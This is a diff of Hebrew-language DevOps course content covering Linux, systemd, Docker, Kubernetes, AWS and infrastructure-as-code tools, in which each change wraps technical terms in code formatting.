   <tr><td><code>journalctl -u nginx -f</code></td><td>לוגים בזמן אמת לשירות ספציפי</td></tr>
 </table>
@@ -7277,7 +7277,7 @@ du -sh /var/log/* | sort -rh | head -10</code></pre></div>
         type: "explanation",
         title: "הרשאות — chmod, chown",
         content: `<div dir="rtl">
-<h2>מודל ההרשאות של Linux</h2>
+<h2>מודל ההרשאות של <code>Linux</code></h2>
 <p>כל קובץ שייך ל<strong>משתמש</strong> ול<strong>קבוצה</strong>.</p>
 <p>לכל קובץ יש 3 סטי הרשאות:</p>
 <div class="diagram-container">
@@ -7330,8 +7330,8 @@ chmod u+s /usr/bin/sudo # SUID — רץ כבעלים</code></pre></div>
         type: "explanation",
         title: "systemd — ניהול שירותים",
         content: `<div dir="rtl">
-<h2>systemd — init מערכת מודרני</h2>
-<p><strong>systemd</strong> — התהליך הראשון שרץ ב-<code>Linux</code> — <code>PID 1</code></p>
+<h2><code>systemd</code> — <code>init</code> מערכת מודרני</h2>
+<p><strong><code>systemd</code></strong> — התהליך הראשון שרץ ב-<code>Linux</code> — <code>PID 1</code></p>
 <p>מנהל את כל השירותים, ה-<code>mount points</code> וה-<code>timers</code>.</p>
 <table class="content-table">
   <tr><th>פקודה</th><th>פעולה</th></tr>
@@ -7363,7 +7363,7 @@ WantedBy=multi-user.target
 sudo systemctl daemon-reload
 sudo systemctl enable myapp
 sudo systemctl start myapp</code></pre></div>
-<p><strong>יתרון גדול של systemd</strong></p>
+<p><strong>יתרון גדול של <code>systemd</code></strong></p>
 <p><code>Restart=on-failure</code> — השירות יקום אוטומטית אחרי קריסה.</p>
 <p>אין צורך ב-<code>cron</code> או <code>supervisor</code> חיצוני.</p>
 </div>`
@@ -7379,7 +7379,7 @@ sudo systemctl start myapp</code></pre></div>
         title: "VM לעומת קונטיינר",
         content: `<div dir="rtl">
 <h2>המהפכה של הקונטיינרים</h2>
-<p><strong>VM</strong> — <code>Virtual Machine</code></p>
+<p><strong><code>VM</code></strong> — <code>Virtual Machine</code></p>
 <p>לפני <code>Docker</code>, כל אפליקציה הצריכה <code>VM</code> שלמה — גרעין, <code>OS</code> מלא, <code>RAM</code> נפרד.</p>
 <p>הבזבוז היה עצום.</p>
 <div class="diagram-container">
@@ -7414,17 +7414,17 @@ sudo systemctl start myapp</code></pre></div>
 </svg>
 </div>
 <table class="content-table">
-  <tr><th>מאפיין</th><th>VM</th><th>Container</th></tr>
-  <tr><td>גודל</td><td>GBs</td><td>MBs</td></tr>
+  <tr><th>מאפיין</th><th><code>VM</code></th><th><code>Container</code></th></tr>
+  <tr><td>גודל</td><td><code>GBs</code></td><td><code>MBs</code></td></tr>
   <tr><td>זמן הפעלה</td><td>דקות</td><td>שניות / מילישניות</td></tr>
-  <tr><td>גרעין</td><td>נפרד לכל VM</td><td>משותף עם Host</td></tr>
+  <tr><td>גרעין</td><td>נפרד לכל <code>VM</code></td><td>משותף עם <code>Host</code></td></tr>
   <tr><td>בידוד</td><td>חזק מאוד</td><td>חזק (namespaces)</td></tr>
-  <tr><td>ביצועים</td><td>תקורה גבוהה</td><td>כמעט כמו native</td></tr>
+  <tr><td>ביצועים</td><td>תקורה גבוהה</td><td>כמעט כמו <code>native</code></td></tr>
 </table>
-<p><strong>Docker</strong> — משתמש בשני מנגנונים של <code>Linux kernel</code>:</p>
+<p><strong><code>Docker</code></strong> — משתמש בשני מנגנונים של <code>Linux kernel</code>:</p>
 <ul>
-<li><strong>namespaces</strong> — בידוד בין <code>containers</code></li>
-<li><strong>cgroups</strong> — הגבלת משאבים כמו <code>CPU</code> ו-<code>RAM</code></li>
+<li><strong><code>namespaces</code></strong> — בידוד בין <code>containers</code></li>
+<li><strong><code>cgroups</code></strong> — הגבלת משאבים כמו <code>CPU</code> ו-<code>RAM</code></li>
 </ul>
 </div>`
       },
@@ -7432,8 +7432,8 @@ sudo systemctl start myapp</code></pre></div>
         type: "explanation",
         title: "Dockerfile — בניית image",
         content: `<div dir="rtl">
-<h2>Dockerfile — הוראות הבנייה</h2>
-<p><strong>Dockerfile</strong></p>
+<h2><code>Dockerfile</code> — הוראות הבנייה</h2>
+<p><strong><code>Dockerfile</code></strong></p>
 <p>קובץ טקסט שמגדיר שכבה-אחר-שכבה איך לבנות <code>image</code>.</p>
 <p>כל פקודה יוצרת שכבה חדשה ב-<code>filesystem</code>.</p>
 <div class="code-preview"><pre><code># Dockerfile לאפליקציית Python/FastAPI
@@ -7479,8 +7479,8 @@ docker exec -it myapp bash</code></pre></div>
         type: "explanation",
         title: "Docker Compose — multi-container",
         content: `<div dir="rtl">
-<h2>Docker Compose — כמה שירותים יחד</h2>
-<p><strong>Docker Compose</strong></p>
+<h2><code>Docker Compose</code> — כמה שירותים יחד</h2>
+<p><strong><code>Docker Compose</code></strong></p>
 <p>בפרויקטים אמיתיים יש <code>backend</code> + <code>database</code> + <code>cache</code> + <code>nginx</code>.</p>
 <p><code>Compose</code> מאפשר להגדיר את כל השירותים בקובץ <code>YAML</code> אחד.</p>
 <div class="code-preview"><pre><code># docker-compose.yml
@@ -7540,16 +7540,16 @@ docker compose exec db psql -U user mydb  # כנס ל-DB</code></pre></div>
         type: "explanation",
         title: "Docker Networking",
         content: `<div dir="rtl">
-<h2>רשתות Docker — Bridge, Host, Overlay</h2>
-<p><strong>רשתות Docker</strong></p>
+<h2>רשתות <code>Docker</code> — <code>Bridge</code>, <code>Host</code>, <code>Overlay</code></h2>
+<p><strong>רשתות <code>Docker</code></strong></p>
 <p><code>Docker</code> יוצר רשתות וירטואליות שמאפשרות תקשורת בין <code>containers</code>.</p>
 <p>הרשתות מבודדות לחלוטין מהעולם החיצוני.</p>
 <table class="content-table">
   <tr><th>סוג רשת</th><th>שימוש</th><th>IP</th></tr>
-  <tr><td><strong>bridge</strong></td><td>ברירת מחדל — קונטיינרים על אותו host</td><td>172.17.0.x</td></tr>
-  <tr><td><strong>host</strong></td><td>קונטיינר משתמש ב-network של ה-host ישירות</td><td>כמו host</td></tr>
-  <tr><td><strong>none</strong></td><td>בידוד מלא — אין רשת</td><td>—</td></tr>
-  <tr><td><strong>overlay</strong></td><td>Swarm / K8s — תקשורת בין hosts שונים</td><td>10.0.x.x</td></tr>
+  <tr><td><strong><code>bridge</code></strong></td><td>ברירת מחדל — קונטיינרים על אותו <code>host</code></td><td>172.17.0.x</td></tr>
+  <tr><td><strong><code>host</code></strong></td><td>קונטיינר משתמש ב-<code>network</code> של ה-<code>host</code> ישירות</td><td>כמו <code>host</code></td></tr>
+  <tr><td><strong><code>none</code></strong></td><td>בידוד מלא — אין רשת</td><td>—</td></tr>
+  <tr><td><strong><code>overlay</code></strong></td><td><code>Swarm</code> / <code>K8s</code> — תקשורת בין <code>hosts</code> שונים</td><td>10.0.x.x</td></tr>
 </table>
 <div class="code-preview"><pre><code># רשת מותאמת אישית — מומלץ תמיד!
 docker network create mynet
@@ -7585,8 +7585,8 @@ docker network create --driver overlay --attachable prod-net</code></pre></div>
         type: "explanation",
         title: "אובייקטים בסיסיים — Pod, Deployment, Service",
         content: `<div dir="rtl">
-<h2>הבניים הבסיסיים של K8s</h2>
-<p><strong>Kubernetes</strong> — <code>K8s</code></p>
+<h2>הבניים הבסיסיים של <code>K8s</code></h2>
+<p><strong><code>Kubernetes</code></strong> — <code>K8s</code></p>
 <p>מנהל <code>containers</code> בקנה מידה.</p>
 <p>במקום "הפעל <code>container</code>", אתה מגדיר <strong>מצב רצוי</strong>.</p>
 <p><code>K8s</code> דואג שהמצב הזה תמיד יתקיים.</p>
@@ -7619,12 +7619,12 @@ docker network create --driver overlay --attachable prod-net</code></pre></div>
 </div>
 <table class="content-table">
   <tr><th>אובייקט</th><th>תפקיד</th></tr>
-  <tr><td><strong>Pod</strong></td><td>יחידה הקטנה ביותר — קונטיינר אחד או יותר עם <code>IP</code> משותף</td></tr>
-  <tr><td><strong>Deployment</strong></td><td>מנהל <code>replicas</code> של <code>Pods</code> — מבטיח שתמיד N עותקים רצים</td></tr>
-  <tr><td><strong>Service</strong></td><td>כתובת <code>IP</code> קבועה ו-<code>load balancer</code> פנימי ל-<code>Pods</code></td></tr>
-  <tr><td><strong>Ingress</strong></td><td><code>HTTP routing</code> חיצוני — ניתוב לפי <code>hostname</code> או <code>path</code></td></tr>
-  <tr><td><strong>ConfigMap</strong></td><td>הגדרות לא-סודיות כ-<code>key-value</code></td></tr>
-  <tr><td><strong>Secret</strong></td><td>סיסמאות ו-<code>tokens</code> מוצפנים — <code>base64</code></td></tr>
+  <tr><td><strong><code>Pod</code></strong></td><td>יחידה הקטנה ביותר — קונטיינר אחד או יותר עם <code>IP</code> משותף</td></tr>
+  <tr><td><strong><code>Deployment</code></strong></td><td>מנהל <code>replicas</code> של <code>Pods</code> — מבטיח שתמיד N עותקים רצים</td></tr>
+  <tr><td><strong><code>Service</code></strong></td><td>כתובת <code>IP</code> קבועה ו-<code>load balancer</code> פנימי ל-<code>Pods</code></td></tr>
+  <tr><td><strong><code>Ingress</code></strong></td><td><code>HTTP routing</code> חיצוני — ניתוב לפי <code>hostname</code> או <code>path</code></td></tr>
+  <tr><td><strong><code>ConfigMap</code></strong></td><td>הגדרות לא-סודיות כ-<code>key-value</code></td></tr>
+  <tr><td><strong><code>Secret</code></strong></td><td>סיסמאות ו-<code>tokens</code> מוצפנים — <code>base64</code></td></tr>
 </table>
 </div>`
       },
@@ -7697,15 +7697,15 @@ kubectl rollout history deploy/myapp  # היסטוריית deploys</code></pre><
         title: "HPA — Horizontal Pod Autoscaling",
         content: `<div dir="rtl">
 <h2>סקיילינג אוטומטי לפי עומס</h2>
-<p><strong>HPA</strong> — <code>Horizontal Pod Autoscaler</code></p>
+<p><strong><code>HPA</code></strong> — <code>Horizontal Pod Autoscaler</code></p>
 <p>מוסיף או מסיר <code>Pods</code> אוטומטית לפי מדדים.</p>
 <p>מדדים נתמכים: <code>CPU</code>, <code>Memory</code>, ומדדים מותאמים כמו בקשות לשנייה.</p>
 <table class="content-table">
   <tr><th>מדד</th><th>טריגר</th><th>פעולה</th></tr>
-  <tr><td>CPU &gt; 70%</td><td>scale up</td><td>מוסיף Pods עד maxReplicas</td></tr>
-  <tr><td>CPU &lt; 20%</td><td>scale down</td><td>מסיר Pods עד minReplicas</td></tr>
-  <tr><td>Memory</td><td>מותאם</td><td>פחות נפוץ — תלוי workload</td></tr>
-  <tr><td>Custom metric</td><td>Prometheus</td><td>כמות requests/s וכו'</td></tr>
+  <tr><td>CPU &gt; 70%</td><td><code>scale up</code></td><td>מוסיף <code>Pods</code> עד <code>maxReplicas</code></td></tr>
+  <tr><td>CPU &lt; 20%</td><td><code>scale down</code></td><td>מסיר <code>Pods</code> עד <code>minReplicas</code></td></tr>
+  <tr><td>Memory</td><td>מותאם</td><td>פחות נפוץ — תלוי <code>workload</code></td></tr>
+  <tr><td><code>Custom metric</code></td><td><code>Prometheus</code></td><td>כמות <code>requests/s</code> וכו'</td></tr>
 </table>
 <div class="code-preview"><pre><code># hpa.yaml
 apiVersion: autoscaling/v2
@@ -7733,10 +7733,10 @@ kubectl rollout status deployment/myapp
 
 # Rollback אם משהו השתבש
 kubectl rollout undo deployment/myapp</code></pre></div>
-<p><strong>Rolling Update</strong></p>
+<p><strong><code>Rolling Update</code></strong></p>
 <p><code>K8s</code> מחליף <code>Pods</code> אחד-אחד.</p>
 <p>בכל רגע יש גם <code>Pods</code> ישנים וגם חדשים — אין <code>downtime</code>.</p>
-<p><strong>strategy.maxUnavailable</strong></p>
+<p><strong><code>strategy.maxUnavailable</code></strong></p>
 <p>כמה <code>Pods</code> יכולים להיות <code>unavailable</code> בו-זמנית — ברירת מחדל: 25%.</p>
 </div>`
       },
@@ -7750,10 +7750,10 @@ kubectl rollout undo deployment/myapp</code></pre></div>
 <p>כל <code>Pod</code> יכול לתקשר עם כל <code>Pod</code> אחר — גם על <code>node</code> אחר.</p>
 <table class="content-table">
   <tr><th>רכיב</th><th>תפקיד</th></tr>
-  <tr><td><strong>CNI Plugin</strong></td><td>מימוש רשת — <code>Calico</code> / <code>Flannel</code> / <code>Weave</code>. מקצה <code>IPs</code> ל-<code>Pods</code></td></tr>
-  <tr><td><strong>CoreDNS</strong></td><td>DNS פנימי — <code>myapp-svc.production.svc.cluster.local</code></td></tr>
-  <tr><td><strong>kube-proxy</strong></td><td><code>iptables rules</code> לניתוב תעבורה ל-<code>Services</code></td></tr>
-  <tr><td><strong>Ingress Controller</strong></td><td><code>nginx</code> / <code>Traefik</code> — <code>HTTP routing</code> חיצוני</td></tr>
+  <tr><td><strong><code>CNI Plugin</code></strong></td><td>מימוש רשת — <code>Calico</code> / <code>Flannel</code> / <code>Weave</code>. מקצה <code>IPs</code> ל-<code>Pods</code></td></tr>
+  <tr><td><strong><code>CoreDNS</code></strong></td><td>DNS פנימי — <code>myapp-svc.production.svc.cluster.local</code></td></tr>
+  <tr><td><strong><code>kube-proxy</code></strong></td><td><code>iptables rules</code> לניתוב תעבורה ל-<code>Services</code></td></tr>
+  <tr><td><strong><code>Ingress Controller</code></strong></td><td><code>nginx</code> / <code>Traefik</code> — <code>HTTP routing</code> חיצוני</td></tr>
 </table>
 <div class="code-preview"><pre><code># ingress.yaml
 apiVersion: networking.k8s.io/v1
@@ -7785,7 +7785,7 @@ spec:
   - hosts:
     - myapp.example.com
     secretName: tls-secret</code></pre></div>
-<p><strong>DNS resolution</strong></p>
+<p><strong><code>DNS resolution</code></strong></p>
 <p><code>Pod</code> ב-<code>namespace production</code> ניגש לשירות <code>db-svc</code> פשוט בשם <code>db-svc.production</code>.</p>
 <p>אין צורך לציין <code>IP</code> מפורש.</p>
 </div>`
@@ -7806,17 +7806,17 @@ spec:
 <p>ככל שעולים ברמות, מקבלים פחות שליטה — אבל גם פחות עבודה.</p>
 <table class="content-table">
   <tr><th>מודל</th><th>אתה מנהל</th><th>הספק מנהל</th><th>דוגמה ב-AWS</th></tr>
-  <tr><td><strong>IaaS</strong></td><td>OS, Runtime, App</td><td>חומרה, וירטואליזציה, רשת</td><td>EC2, EBS, VPC</td></tr>
-  <tr><td><strong>PaaS</strong></td><td>הקוד שלך בלבד</td><td>OS, Runtime, Scaling, DB</td><td>Elastic Beanstalk, RDS</td></tr>
-  <tr><td><strong>SaaS</strong></td><td>הגדרות משתמש</td><td>הכל</td><td>Gmail, Salesforce</td></tr>
-  <tr><td><strong>FaaS</strong></td><td>פונקציה בודדת</td><td>הכל כולל scaling</td><td>AWS Lambda</td></tr>
+  <tr><td><strong><code>IaaS</code></strong></td><td><code>OS</code>, <code>Runtime</code>, <code>App</code></td><td>חומרה, וירטואליזציה, רשת</td><td><code>EC2</code>, <code>EBS</code>, <code>VPC</code></td></tr>
+  <tr><td><strong><code>PaaS</code></strong></td><td>הקוד שלך בלבד</td><td><code>OS</code>, <code>Runtime</code>, <code>Scaling</code>, <code>DB</code></td><td><code>Elastic Beanstalk</code>, <code>RDS</code></td></tr>
+  <tr><td><strong><code>SaaS</code></strong></td><td>הגדרות משתמש</td><td>הכל</td><td><code>Gmail</code>, <code>Salesforce</code></td></tr>
+  <tr><td><strong><code>FaaS</code></strong></td><td>פונקציה בודדת</td><td>הכל כולל <code>scaling</code></td><td><code>AWS Lambda</code></td></tr>
 </table>
 <p><strong>אנלוגיה — פיצה</strong></p>
 <ul>
-  <li><strong>On-Premise</strong> — בישול בבית. אתה קונה הכל</li>
-  <li><strong>IaaS</strong> — קיבלת מטבח מצויד. אתה מבשל</li>
-  <li><strong>PaaS</strong> — הזמנת חומרי גלם. המסעדה מבשלת</li>
-  <li><strong>SaaS</strong> — הזמנת פיצה. אתה רק אוכל</li>
+  <li><strong><code>On-Premise</code></strong> — בישול בבית. אתה קונה הכל</li>
+  <li><strong><code>IaaS</code></strong> — קיבלת מטבח מצויד. אתה מבשל</li>
+  <li><strong><code>PaaS</code></strong> — הזמנת חומרי גלם. המסעדה מבשלת</li>
+  <li><strong><code>SaaS</code></strong> — הזמנת פיצה. אתה רק אוכל</li>
 </ul>
 <p><strong>מדוע ענן?</strong></p>
 <p>ארבעה יתרונות מרכזיים:</p>
@@ -7827,7 +7827,7 @@ spec:
 <li><code>Managed security</code> — אבטחה מנוהלת</li>
 </ul>
 <p><strong>דוגמה</strong></p>
-<p>Netflix מפעילה מיליוני שרתים ב-<code>AWS</code> ומשלמת רק על מה שנצרך.</p>
+<p><code>Netflix</code> מפעילה מיליוני שרתים ב-<code>AWS</code> ומשלמת רק על מה שנצרך.</p>
 </div>`
       },
       {
@@ -7838,14 +7838,14 @@ spec:
 <p><strong>שירותי ליבה</strong></p>
 <table class="content-table">
   <tr><th>שירות</th><th>מה זה</th><th>שימוש נפוץ</th></tr>
-  <tr><td><strong>EC2</strong></td><td>שרתים וירטואליים — <code>Virtual Machines</code></td><td><code>backend</code>, <code>web servers</code></td></tr>
-  <tr><td><strong>S3</strong></td><td>אחסון <code>object</code> — בלתי מוגבל</td><td>תמונות, <code>backups</code>, <code>static site</code></td></tr>
-  <tr><td><strong>RDS</strong></td><td><code>DB</code> מנוהל — <code>Postgres</code> / <code>MySQL</code> / <code>Aurora</code></td><td>מסד נתונים ראשי</td></tr>
-  <tr><td><strong>VPC</strong></td><td>רשת פרטית וירטואלית</td><td>בידוד ואבטחה</td></tr>
-  <tr><td><strong>Route 53</strong></td><td><code>DNS</code> מנוהל + <code>health checks</code></td><td>ניתוב תעבורה עולמית</td></tr>
-  <tr><td><strong>ALB</strong></td><td><code>Application Load Balancer</code></td><td>חלוקת עומסים, <code>SSL termination</code></td></tr>
-  <tr><td><strong>ECS/EKS</strong></td><td>הרצת קונטיינרים / <code>Kubernetes</code></td><td><code>microservices</code></td></tr>
-  <tr><td><strong>Lambda</strong></td><td><code>serverless functions</code></td><td><code>event-driven</code>, <code>batch jobs</code></td></tr>
+  <tr><td><strong><code>EC2</code></strong></td><td>שרתים וירטואליים — <code>Virtual Machines</code></td><td><code>backend</code>, <code>web servers</code></td></tr>
+  <tr><td><strong><code>S3</code></strong></td><td>אחסון <code>object</code> — בלתי מוגבל</td><td>תמונות, <code>backups</code>, <code>static site</code></td></tr>
+  <tr><td><strong><code>RDS</code></strong></td><td><code>DB</code> מנוהל — <code>Postgres</code> / <code>MySQL</code> / <code>Aurora</code></td><td>מסד נתונים ראשי</td></tr>
+  <tr><td><strong><code>VPC</code></strong></td><td>רשת פרטית וירטואלית</td><td>בידוד ואבטחה</td></tr>
+  <tr><td><strong><code>Route 53</code></strong></td><td><code>DNS</code> מנוהל + <code>health checks</code></td><td>ניתוב תעבורה עולמית</td></tr>
+  <tr><td><strong><code>ALB</code></strong></td><td><code>Application Load Balancer</code></td><td>חלוקת עומסים, <code>SSL termination</code></td></tr>
+  <tr><td><strong><code>ECS/EKS</code></strong></td><td>הרצת קונטיינרים / <code>Kubernetes</code></td><td><code>microservices</code></td></tr>
+  <tr><td><strong><code>Lambda</code></strong></td><td><code>serverless functions</code></td><td><code>event-driven</code>, <code>batch jobs</code></td></tr>
 </table>
 <div class="code-preview"><pre><code># AWS CLI — דוגמאות
 # הפעל EC2 instance
@@ -7868,19 +7868,19 @@ aws rds describe-db-instances \
         title: "VPC — רשת פרטית וירטואלית",
         content: `<div dir="rtl">
 <h2>VPC — הרשת שלך בענן</h2>
-<p><strong>VPC</strong> — <code>Virtual Private Cloud</code></p>
+<p><strong><code>VPC</code></strong> — <code>Virtual Private Cloud</code></p>
 <p>הרשת הפרטית שלך ב-<code>AWS</code>.</p>
 <p>כל דבר שתקים יהיה בתוכה.</p>
 <p><strong>מבנה השכבות</strong></p>
 <table class="content-table">
   <tr><th>רכיב VPC</th><th>תפקיד</th><th>CIDR לדוגמה</th></tr>
-  <tr><td><strong>VPC</strong></td><td>הרשת הראשית שלך</td><td>10.0.0.0/16</td></tr>
-  <tr><td><strong>Public Subnet</strong></td><td>גישה לאינטרנט — ALB, NAT GW</td><td>10.0.1.0/24</td></tr>
-  <tr><td><strong>Private Subnet</strong></td><td>שרתים פנימיים — EC2, RDS</td><td>10.0.2.0/24</td></tr>
-  <tr><td><strong>Internet Gateway</strong></td><td>שער לאינטרנט</td><td>—</td></tr>
-  <tr><td><strong>NAT Gateway</strong></td><td>Private Subnet יוצא לאינטרנט</td><td>—</td></tr>
-  <tr><td><strong>Security Group</strong></td><td>Firewall ברמת instance</td><td>—</td></tr>
-  <tr><td><strong>NACL</strong></td><td>Firewall ברמת subnet</td><td>—</td></tr>
+  <tr><td><strong><code>VPC</code></strong></td><td>הרשת הראשית שלך</td><td>10.0.0.0/16</td></tr>
+  <tr><td><strong><code>Public Subnet</code></strong></td><td>גישה לאינטרנט — <code>ALB</code>, <code>NAT GW</code></td><td>10.0.1.0/24</td></tr>
+  <tr><td><strong><code>Private Subnet</code></strong></td><td>שרתים פנימיים — <code>EC2</code>, <code>RDS</code></td><td>10.0.2.0/24</td></tr>
+  <tr><td><strong><code>Internet Gateway</code></strong></td><td>שער לאינטרנט</td><td>—</td></tr>
+  <tr><td><strong><code>NAT Gateway</code></strong></td><td><code>Private Subnet</code> יוצא לאינטרנט</td><td>—</td></tr>
+  <tr><td><strong><code>Security Group</code></strong></td><td><code>Firewall</code> ברמת <code>instance</code></td><td>—</td></tr>
+  <tr><td><strong><code>NACL</code></strong></td><td><code>Firewall</code> ברמת <code>subnet</code></td><td>—</td></tr>
 </table>
 <p><strong>כלל אצבע</strong></p>
 <ul>
@@ -7899,29 +7899,29 @@ aws rds describe-db-instances \
         title: "Multi-AZ וסיפור ה-Chaos Monkey של Netflix",
         content: `<div dir="rtl">
 <h2>High Availability — Multi-AZ Design</h2>
-<p><strong>Availability Zones</strong> — AZs</p>
+<p><strong><code>Availability Zones</code></strong> — <code>AZs</code></p>
 <p><code>AWS</code> מחלקת כל <code>Region</code> ל-<code>Availability Zones</code>.</p>
 <p>אלו מרכזי נתונים פיזיים נפרדים, מחוברים בסיבים מהירים.</p>
 <table class="content-table">
   <tr><th>עיצוב</th><th>זמינות</th><th>עלות</th></tr>
-  <tr><td>Single-AZ</td><td>99.9%</td><td>זולה</td></tr>
-  <tr><td>Multi-AZ (Active-Passive)</td><td>99.99%</td><td>x2</td></tr>
-  <tr><td>Multi-Region</td><td>99.999%</td><td>x4-6</td></tr>
+  <tr><td><code>Single-AZ</code></td><td>99.9%</td><td>זולה</td></tr>
+  <tr><td><code>Multi-AZ</code> (<code>Active-Passive</code>)</td><td>99.99%</td><td>x2</td></tr>
+  <tr><td><code>Multi-Region</code></td><td>99.999%</td><td>x4-6</td></tr>
 </table>
-<p><strong>RDS Multi-AZ</strong></p>
+<p><strong><code>RDS Multi-AZ</code></strong></p>
 <p><code>Primary</code> ב-<code>AZ-1</code> + <code>Standby</code> ב-<code>AZ-2</code>.</p>
 <p><code>Failover</code> אוטומטי תוך 60-120 שניות אם ה-<code>Primary</code> נפל.</p>
 <h3>סיפור — Netflix Chaos Monkey</h3>
-<p>ב-2010 Netflix פיתחה כלי שנקרא <strong>Chaos Monkey</strong>.</p>
+<p>ב-2010 <code>Netflix</code> פיתחה כלי שנקרא <strong><code>Chaos Monkey</code></strong>.</p>
 <p>תוכנה שמכבה <code>instance</code> אקראי בפרודקשן, כל יום, בשעות העבודה.</p>
 <p>הרציונל: "אם נדע שהכל יכול ליפול בכל רגע, נבנה מערכת שמתמודדת עם זה."</p>
-<p><code>Chaos Monkey</code> הפכה ל-<strong>Simian Army</strong> שכוללת:</p>
+<p><code>Chaos Monkey</code> הפכה ל-<strong><code>Simian Army</code></strong> שכוללת:</p>
 <ul>
-  <li><strong>Chaos Gorilla</strong> — מוריד <code>AZ</code> שלמה</li>
-  <li><strong>Latency Monkey</strong> — מוסיף <code>latency</code> לתגובות</li>
-  <li><strong>Conformity Monkey</strong> — מוצא <code>instances</code> שלא עומדים בסטנדרטים</li>
+  <li><strong><code>Chaos Gorilla</code></strong> — מוריד <code>AZ</code> שלמה</li>
+  <li><strong><code>Latency Monkey</code></strong> — מוסיף <code>latency</code> לתגובות</li>
+  <li><strong><code>Conformity Monkey</code></strong> — מוצא <code>instances</code> שלא עומדים בסטנדרטים</li>
 </ul>
-<p>התוצאה: Netflix מריצה מיליוני <code>streams</code> בו-זמנית עם 99.99%+ <code>uptime</code>.</p>
+<p>התוצאה: <code>Netflix</code> מריצה מיליוני <code>streams</code> בו-זמנית עם 99.99%+ <code>uptime</code>.</p>
 <p>הסוד: הם <strong>תכננו לכישלון</strong> מראש.</p>
 </div>`
       }
@@ -7935,27 +7935,27 @@ aws rds describe-db-instances \
         type: "explanation",
         title: "פילוסופיית DevOps",
         content: `<div dir="rtl">
-<h2>DevOps — שבירת הקירות</h2>
-<p><strong>DevOps</strong></p>
+<h2><code>DevOps</code> — שבירת הקירות</h2>
+<p><strong><code>DevOps</code></strong></p>
 <p>לפני <code>DevOps</code>, הצוותים <code>Development</code> ו-<code>Operations</code> היו נפרדים לחלוטין.</p>
 <p><code>Dev</code> רצה לשלוח קוד מהר.</p>
 <p><code>Ops</code> רצה יציבות.</p>
 <p>התמריצים היו מנוגדים. התוצאה: <code>deploy</code> פעם בחודש, וכאוס.</p>
 <table class="content-table">
   <tr><th>עיקרון</th><th>משמעות</th></tr>
-  <tr><td><strong>Continuous Integration</strong></td><td>כל push → build + tests אוטומטיים</td></tr>
-  <tr><td><strong>Continuous Delivery</strong></td><td>כל commit מוכן לדפלוי בלחיצת כפתור</td></tr>
-  <tr><td><strong>Continuous Deployment</strong></td><td>כל commit עולה לפרודקשן אוטומטית</td></tr>
-  <tr><td><strong>Infrastructure as Code</strong></td><td>תשתית = קוד ב-Git, גרסאות, review</td></tr>
-  <tr><td><strong>Shift Left</strong></td><td>security ו-testing מוקדם בתהליך</td></tr>
+  <tr><td><strong><code>Continuous Integration</code></strong></td><td>כל <code>push</code> → <code>build</code> + <code>tests</code> אוטומטיים</td></tr>
+  <tr><td><strong><code>Continuous Delivery</code></strong></td><td>כל <code>commit</code> מוכן לדפלוי בלחיצת כפתור</td></tr>
+  <tr><td><strong><code>Continuous Deployment</code></strong></td><td>כל <code>commit</code> עולה לפרודקשן אוטומטית</td></tr>
+  <tr><td><strong><code>Infrastructure as Code</code></strong></td><td>תשתית = קוד ב-<code>Git</code>, גרסאות, <code>review</code></td></tr>
+  <tr><td><strong><code>Shift Left</code></strong></td><td><code>security</code> ו-<code>testing</code> מוקדם בתהליך</td></tr>
 </table>
-<p><strong>מדדי DORA</strong> — מחקר Google 2019</p>
+<p><strong>מדדי <code>DORA</code></strong> — מחקר <code>Google</code> 2019</p>
 <ul>
   <li><code>Elite teams</code> מדפלויים 973x יותר תכוף מ-<code>low performers</code></li>
   <li>זמן <code>lead time</code> — שעות לעומת חודשים</li>
   <li><code>MTTR</code> — זמן שיקום — שעה לעומת שבוע</li>
 </ul>
-<p>Amazon מדפלויים לפרודקשן כל <strong>11 שניות</strong>.</p>
+<p><code>Amazon</code> מדפלויים לפרודקשן כל <strong>11 שניות</strong>.</p>
 <p>זה אפשרי רק עם אוטומציה מלאה מקצה לקצה.</p>
 </div>`
       },
@@ -7963,8 +7963,8 @@ aws rds describe-db-instances \
         type: "explanation",
         title: "GitHub Actions — CI/CD Pipeline",
         content: `<div dir="rtl">
-<h2>GitHub Actions — אוטומציה בתוך GitHub</h2>
-<p><strong>GitHub Actions</strong></p>
+<h2><code>GitHub Actions</code> — אוטומציה בתוך <code>GitHub</code></h2>
+<p><strong><code>GitHub Actions</code></strong></p>
 <p>מריצה <code>workflows</code> אוטומטיים על כל <code>push</code>, <code>PR</code>, או לפי לוח זמנים.</p>
 <p>אין צורך בשרת <code>CI</code> נפרד.</p>
 <div class="code-preview"><pre><code># .github/workflows/deploy.yml
@@ -8029,7 +8029,7 @@ jobs:
         title: "Terraform — Infrastructure as Code",
         content: `<div dir="rtl">
 <h2>Terraform — תשתית כקוד</h2>
-<p><strong>Terraform</strong> — מבית <code>HashiCorp</code></p>
+<p><strong><code>Terraform</code></strong> — מבית <code>HashiCorp</code></p>
 <p>מאפשר להגדיר תשתית <code>AWS</code> / <code>GCP</code> / <code>Azure</code> בקבצי <code>HCL</code>.</p>
 <p>הכל מנוהל ב-<code>Git</code>.</p>
 <p>שינויים עוברים <code>review</code> לפני <code>apply</code>, והתוצאה ניתנת לשחזור.</p>
@@ -8078,7 +8078,7 @@ terraform init    # הורדת providers
 terraform plan    # תצוגה מקדימה — מה ישתנה?
 terraform apply   # ביצוע השינויים
 terraform destroy # הריסה מבוקרת</code></pre></div>
-<p><strong>State file</strong></p>
+<p><strong><code>State file</code></strong></p>
 <p><code>Terraform</code> שומר את המצב ב-<code>terraform.tfstate</code>.</p>
 <p>בצוות — שומרים את ה-<code>state</code> ב-<code>S3</code> עם <code>DynamoDB locking</code> למניעת כתיבה מקבילה.</p>
 </div>`
@@ -8088,15 +8088,15 @@ terraform destroy # הריסה מבוקרת</code></pre></div>
         title: "Ansible — Configuration Management",
         content: `<div dir="rtl">
 <h2>Ansible — הגדרת שרתים בקנה מידה</h2>
-<p><strong>Ansible</strong></p>
+<p><strong><code>Ansible</code></strong></p>
 <p>מגדיר את מצב השרתים — <code>packages</code>, <code>files</code>, <code>services</code> — בצורה דקלרטיבית.</p>
-<p><strong>Agentless</strong></p>
+<p><strong><code>Agentless</code></strong></p>
 <p>עובד על <code>SSH</code> בלבד, ללא התקנת <code>agent</code> על השרתים.</p>
 <table class="content-table">
   <tr><th>כלי</th><th>תפקיד</th><th>שפה</th></tr>
-  <tr><td>Terraform</td><td>יצירת תשתית (provision)</td><td>HCL</td></tr>
-  <tr><td>Ansible</td><td>הגדרת תוכן שרתים (configure)</td><td>YAML</td></tr>
-  <tr><td>GitHub Actions</td><td>pipeline CI/CD</td><td>YAML</td></tr>
